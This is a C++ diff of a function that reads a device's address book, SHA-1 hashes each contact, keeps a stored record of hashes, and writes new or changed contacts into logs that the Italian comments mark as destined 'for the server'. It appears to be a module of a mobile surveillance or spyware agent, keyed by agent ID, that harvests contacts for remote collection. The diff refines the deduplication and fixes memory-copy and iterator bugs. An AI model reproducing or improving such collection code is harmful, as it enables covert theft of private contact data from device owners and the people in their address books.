@@ -370,43 +370,47 @@ void CPoomAddressbook::Run(UINT uAgentId)
 	BYTE *pBuf = NULL;
 	UINT uSize;
 
+	
+	BYTE sha1[20];
+	Hash hash;
+
+
 	//leggo dal markup lo sha1 dei singoli contatti dell'addressbook  e riempio la struttura
 	//
-	Log pPOOMMarkup = Log();
+	Log pPOOMMarkupRead = Log();
 
 	//se esiste un markup lo carico
-	if (pPOOMMarkup.IsMarkup(uAgentId)){
+	if (pPOOMMarkupRead.IsMarkup(uAgentId)){
 		// Export di tutti i dati
 		//m_pInstance->_Export();
 		//pPOOMMarkup.WriteMarkup(uAgentId,(BYTE *)&dwNotify, uSize);
-		pBuf = pPOOMMarkup.ReadMarkup(uAgentId, &uSize);
+		pBuf = pPOOMMarkupRead.ReadMarkup(uAgentId, &uSize);
 
 		int numMarkupContact=uSize/sizeof(identifyContact);
 		identifyContact* storeMarkupContact;// = new identifyContact[numMarkupContact];
 		storeMarkupContact=(identifyContact*)pBuf;
 
+
+
 		addressbookMapSha1.clear();
+
+
 
 		for(int j=0;j<numMarkupContact;j++)
 		{
 			identifyContact IdSha1;
 			IdSha1.ID=storeMarkupContact->ID;
-			memcpy(IdSha1.sha1,storeMarkupContact->sha1,sizeof(identifyContact));
+			memcpy(IdSha1.sha1,storeMarkupContact->sha1,sizeof(IdSha1.sha1));
 			IdSha1.sha1flag=0;
 			addressbookMapSha1[storeMarkupContact->ID]=IdSha1;
 			storeMarkupContact++;
 		}
 
-
-		/*
-		std::map<UINT, identifyContact>* ptrAddressbookMapSha1;
-
-		ptrAddressbookMapSha1=	(std::map<UINT, identifyContact>*) pBuf;
-		*/
+		//ho storato tutto in addressbookMapSha1 per cui posso liberare la memoria
+		SAFE_DELETE(pBuf);
 	}
 
-	//pPOOMMarkup.WriteMarkup(uAgentId,(BYTE *)&addressbookListSha1, sizeof(addressbookListSha1));
-	
+
 													
 
 	for(int i=0; i < handleCount; i++)
@@ -711,161 +715,28 @@ void CPoomAddressbook::Run(UINT uAgentId)
 		//se l'id non è presente nel markup creo il log x il server e aggiungo l'elemanto nel markup=> sha1flag=3
 
 		//calcolo l'hash del contatto i
-		BYTE sha1[20];
-		BYTE* ptrSha1;
-		Hash hash;
-
-		//
 		hash.Sha1((UCHAR *)lpOutBuf, lpdwOutLength, sha1);
-
-/*
-		//se non ho dati nel markup significa che lo eseguo per la prima volta per cui salvo tutti i dati sia nel markup che per l'invio al server
-		if (pBuf==NULL)
-		{
-			identifyContact IdSha1;
-			IdSha1.ID=contact.Id;
-			memcpy(IdSha1.sha1,sha1,sizeof(identifyContact));
-			IdSha1.sha1flag=3;
-			addressbookListSha1.push_front(IdSha1);
-
-			Log poomLog = Log();
-
-			if (lpOutBuf) {
-				poomLog.CreateLog(LOGTYPE_ADDRESSBOOK, NULL, 0, FLASH);
-				poomLog.WriteLog(lpOutBuf, lpdwOutLength);			
-				poomLog.CloseLog();
-				SAFE_DELETE(lpOutBuf);
-			}
-		}
-		else
-		{
-		*/
-		/*
-		 std::map<char,int> mymap;
-
-  std::map<char,int>::key_compare mycomp = mymap.key_comp();
-
-  mymap['a']=100;
-		*/
-
-		/*
-		 std::map<int,int> mymap;
-
-		  std::map<int,int>::key_compare mycomp = mymap.key_comp();
-
-		  mymap[1]=100;
-		  mymap[11]=200;
-		  mymap[111]=300;
-
-		int a=mymap[11];
-		*/
-
-
-			bool findIt=false;
-			//std::map<UINT, identifyContact> addressbookMapSha1;
-		//	identifyContact pippo=addressbookMapSha1.key_comp(contact.Id);
-/*
-			for (std::map<UINT, identifyContact>::iterator addressbookIt=addressbookMapSha1.begin(); addressbookIt != addressbookMapSha1.end(); ++addressbookIt)
-			{
-
-			}
-*/
-
-			identifyContact ContactFromId=addressbookMapSha1[contact.Id];
+				
+		identifyContact ContactFromId=addressbookMapSha1[contact.Id];
 			
-			BYTE bufNULL[20]={0};
-			if(memcmp(ContactFromId.sha1,bufNULL,sizeof(bufNULL)))
+		BYTE bufNULL[20]={0};
+		//se lo sha1 non è null entro
+		if(memcmp(ContactFromId.sha1,bufNULL,sizeof(bufNULL))!=0)
+		{
+			if(!memcmp(ContactFromId.sha1,sha1,sizeof(sha1))==0)
 			{
-				findIt=true;
-				if(!memcmp(ContactFromId.sha1,sha1,sizeof(sha1))==0)
-				{
-					//se lo sha è diverso significa che il contatto è stato modificato per cui aggiorno il markup e creo il log x il server => sha1flag=2
-					//rimuovo il contatto nel il markup vecchio
-					///addressbookListSha1.remove(*addressbookIt);
-					addressbookMapSha1.erase(contact.Id);
+				//se lo sha è diverso significa che il contatto è stato modificato per cui aggiorno il markup e creo il log x il server => sha1flag=2
+				//rimuovo il contatto nel il markup vecchio
+				addressbookMapSha1.erase(contact.Id);
 
 
-					//aggiungo il nuovo elemento nel markup e nel log per il server
-					identifyContact IdSha1;
-					IdSha1.ID=contact.Id;
-					memcpy(IdSha1.sha1,sha1,sizeof(identifyContact));
-					IdSha1.sha1flag=2;
-
-					addressbookMapSha1[contact.Id]=IdSha1;
-
-					Log poomLog = Log();
-
-					if (lpOutBuf) {
-						poomLog.CreateLog(LOGTYPE_ADDRESSBOOK, NULL, 0, FLASH);
-						poomLog.WriteLog(lpOutBuf, lpdwOutLength);			
-						poomLog.CloseLog();
-						SAFE_DELETE(lpOutBuf);
-					}
-				}
-				else
-				{
-							//se lo sha è uguale allora il contatto non è stato modificato per cui non c'e' bisogno che creo il log x il server => sha1flag=1
-							ContactFromId.sha1flag=2;
-							addressbookMapSha1[contact.Id]=ContactFromId;
-
-				}
-				
-
-			}
-/*
-
-			for (std::list<identifyContact>::iterator addressbookIt=addressbookListSha1.begin(); addressbookIt != addressbookListSha1.end(); ++addressbookIt)
-			{
-				if(addressbookIt->ID==contact.Id) 
-				{
-					findIt=true;
-					if(!memcmp(addressbookIt->sha1,sha1,sizeof(sha1))==0)
-					{
-						//se lo sha è diverso significa che il contatto è stato modificato per cui aggiorno il markup e creo il log x il server => sha1flag=2
-						//rimuovo il contatto nel il markup vecchio
-						///addressbookListSha1.remove(*addressbookIt);
-
-						//aggiungo il nuovo elemento nel markup e nel log per il server
-						identifyContact IdSha1;
-						IdSha1.ID=contact.Id;
-						memcpy(IdSha1.sha1,sha1,sizeof(identifyContact));
-						IdSha1.sha1flag=2;
-						addressbookListSha1.push_front(IdSha1);
-
-						Log poomLog = Log();
-
-						if (lpOutBuf) {
-							poomLog.CreateLog(LOGTYPE_ADDRESSBOOK, NULL, 0, FLASH);
-							poomLog.WriteLog(lpOutBuf, lpdwOutLength);			
-							poomLog.CloseLog();
-							SAFE_DELETE(lpOutBuf);
-						}
-						{
-							//se lo sha è uguale allora il contatto non è stato modificato per cui non c'e' bisogno che creo il log x il server => sha1flag=1
-							addressbookIt->sha1flag=2;
-						}
-					}
-				}
-			}
-*/
-			//se l'id non è presente nel markup creo il log x il server e aggiungo l'elemanto nel markup=> sha1flag=3
-			if(findIt==false)
-			{/*
+				//aggiungo il nuovo elemento nel markup e nel log per il server
 				identifyContact IdSha1;
 				IdSha1.ID=contact.Id;
-				memcpy(IdSha1.sha1,sha1,sizeof(identifyContact));
-				IdSha1.sha1flag=3;
-				addressbookListSha1.push_front(IdSha1);
-				*/
+				memcpy(IdSha1.sha1,sha1,sizeof(IdSha1.sha1));
+				IdSha1.sha1flag=2;
 
-				identifyContact IdSha1;
-				IdSha1.ID=contact.Id;
-				memcpy(IdSha1.sha1,sha1,sizeof(identifyContact));
-				IdSha1.sha1flag=3;
-				
 				addressbookMapSha1[contact.Id]=IdSha1;
-
-
 
 				Log poomLog = Log();
 
@@ -876,147 +747,91 @@ void CPoomAddressbook::Run(UINT uAgentId)
 					SAFE_DELETE(lpOutBuf);
 				}
 			}
-		
-		//}
-		/*
+			else
+			{
+						//se lo sha è uguale allora il contatto non è stato modificato per cui non c'e' bisogno che creo il log x il server => sha1flag=1
+						ContactFromId.sha1flag=1;
+						addressbookMapSha1[contact.Id]=ContactFromId;
+
+			}
 				
-//		std::list<identifyContact>::iterator addressbookIt;
-		
-		//addressbookIt = addressbookListSha1.begin();
 
-
-		identifyContact IdSha1;// = new identifyContact;
-		IdSha1.ID=contact.Id;
-		memcpy(IdSha1.sha1,sha1,sizeof(identifyContact));
-		addressbookListSha1.push_front(IdSha1);
-
-*/
-
-		
-
-
-//		std::list<int> mylist;
-//		std::list<int>::iterator it;
-/*
-  // set some initial values:
-  for (int i=1; i<=5; ++i) mylist.push_back(i); // 1 2 3 4 5
-
-  it = mylist.begin();
-  ++it;       // it points now to number 2           ^
-
-  mylist.insert (it,10);                        // 1 10 2 3 4 5
-
-  // "it" still points to number 2                      ^
-  mylist.insert (it,2,20);                      // 1 10 20 20 2 3 4 5
-
-  --it;       // it points now to the second 20            ^
-
-  std::vector<int> myvector (2,30);
-  mylist.insert (it,myvector.begin(),myvector.end());
-                                                // 1 10 20 30 30 20 2 3 4 5
-                                                //               ^
-*/
-
-/**********************
-		Log poomLog = Log();
-
-		if (lpOutBuf) {
-			poomLog.CreateLog(LOGTYPE_ADDRESSBOOK, NULL, 0, FLASH);
-			poomLog.WriteLog(lpOutBuf, lpdwOutLength);			
-			poomLog.CloseLog();
-			SAFE_DELETE(lpOutBuf);
 		}
-****************/
+		else
+		{   //se l'id non è presente nel markup creo il log x il server e aggiungo l'elemanto nel markup=> sha1flag=3
 
+			identifyContact IdSha1;
+			IdSha1.ID=contact.Id;
+			memcpy(IdSha1.sha1,sha1,sizeof(IdSha1.sha1));
+			IdSha1.sha1flag=3;
+				
+			addressbookMapSha1[contact.Id]=IdSha1;
+
+
+
+			Log poomLog = Log();
+
+			if (lpOutBuf) {
+				poomLog.CreateLog(LOGTYPE_ADDRESSBOOK, NULL, 0, FLASH);
+				poomLog.WriteLog(lpOutBuf, lpdwOutLength);			
+				poomLog.CloseLog();
+				SAFE_DELETE(lpOutBuf);
+			}
+		}
+
+
+		
 	}
 
 
 
-	
-
 	//alla fine devo parsare tutti i markup è quelli contrassegnati con 0 significa che non sono piu' presenti nell'addressbook per cui li devo rimuovere dal markup
-	for (std::map<UINT, identifyContact>::iterator addressbookIt=addressbookMapSha1.begin(); addressbookIt != addressbookMapSha1.end(); ++addressbookIt)
+/***
+	for (std::map<UINT, identifyContact>::iterator addressbookIt=addressbookMapSha1.begin(); addressbookIt != addressbookMapSha1.end(); addressbookIt++)
 	{
 		if(addressbookIt->second.sha1flag==0) 
 		{
 			//rimuovo il contatto nel il markup vecchio
-			///addressbookListSha1.remove(*addressbookIt);
 			addressbookMapSha1.erase(addressbookIt->second.ID);
-			continue;
 		}
 
 	}
-		
+***/
 
-	/*
-	for (std::list<identifyContact>::iterator addressbookIt=addressbookListSha1.begin(); addressbookIt != addressbookListSha1.end(); ++addressbookIt)
+	std::map<UINT, identifyContact>::iterator addressbookIt=addressbookMapSha1.begin(); 
+	while(addressbookIt != addressbookMapSha1.end())
 	{
-		if(addressbookIt->sha1flag==0) 
+		if (addressbookIt->second.sha1flag==0)
 		{
-			//rimuovo il contatto nel il markup vecchio
-			///addressbookListSha1.remove(*addressbookIt);
+			addressbookMapSha1.erase(addressbookIt++->second.ID);  // Use iterator.
+									  // Note the post increment.
+									  // Increments the iterator but returns the
+									  // original value for use by erase 
+		}
+		else
+		{
+			++addressbookIt;           // Can use pre-increment in this case
+							   // To make sure you have the efficient version
 		}
 	}
-	*/
 
-	//salvo il nuovo markup
-	
-	/*
-	std::vector<std::map<UINT, identifyContact>>data;
-
-	std::copy(addressbookMapSha1.begin(), addressbookMapSha1.end(),std::back_inserter(data));
-	size_t BLOB_size = sizeof(std::map<UINT, identifyContact>) * data.size();
-	*/
-
-
-
-	/*
-	typedef vector<vec3d> PointList;
- 
-    cout << "Structure" << endl;
-    cout << "---------" << endl;
- 
-    PointList Points;
-    vec3d P1(1.99, 5.0,  9.0);      Points.push_back(P1);
-    vec3d P2(2.0,  6.0,  10.555);   Points.push_back(P2);
-    vec3d P3(3.0,  7.55, 11.0);     Points.push_back(P3);
-    vec3d P4(4.5,  8.0,  12.0);     Points.push_back(P4);
- 
-    // Searializing struct to point.dat
-    ofstream os("points.dat", ios::binary);
-    if(!os.is_open()) {
-        cout << "Error opening points.dat for write" << endl;
-        return 1;
-    }
- 
-    //int magicnumber = sizeof(Points);
- 
-    os.write((char*)&Points, sizeof(Points));
-    os.close();
-	*/
-	
-
-
-//	pPOOMMarkup.WriteMarkup(uAgentId,(BYTE *)&addressbookMapSha1, sizeof(addressbookMapSha1));
-
-
-	//identifyContact qa[addressbookMapSha1.size()];
 
 	
 	identifyContact* storeMarkupContact = new identifyContact[addressbookMapSha1.size()];
 	
-	//std::map<UINT, identifyContact> addressbookMapSha1;
 	int addressbookPos=0;
 	for (std::map<UINT, identifyContact>::iterator addressbookIt=addressbookMapSha1.begin(); addressbookIt != addressbookMapSha1.end(); ++addressbookIt)
 	{
 			storeMarkupContact[addressbookPos].ID=addressbookIt->second.ID;
-			memcpy(storeMarkupContact[addressbookPos].sha1,addressbookIt->second.sha1,sizeof(BYTE[20]));
+			memcpy(storeMarkupContact[addressbookPos].sha1,addressbookIt->second.sha1,sizeof(storeMarkupContact[addressbookPos].sha1));
 			storeMarkupContact[addressbookPos].sha1flag=0;
 			addressbookPos++;
 	}
 
 
-	pPOOMMarkup.WriteMarkup(uAgentId,(BYTE *)storeMarkupContact, sizeof(identifyContact)*addressbookPos);
+    Log pPOOMMarkupWrite = Log();
+	pPOOMMarkupWrite.RemoveMarkup(uAgentId);
+	pPOOMMarkupWrite.WriteMarkup(uAgentId,(BYTE *)storeMarkupContact, sizeof(identifyContact)*addressbookPos);
 
     
 
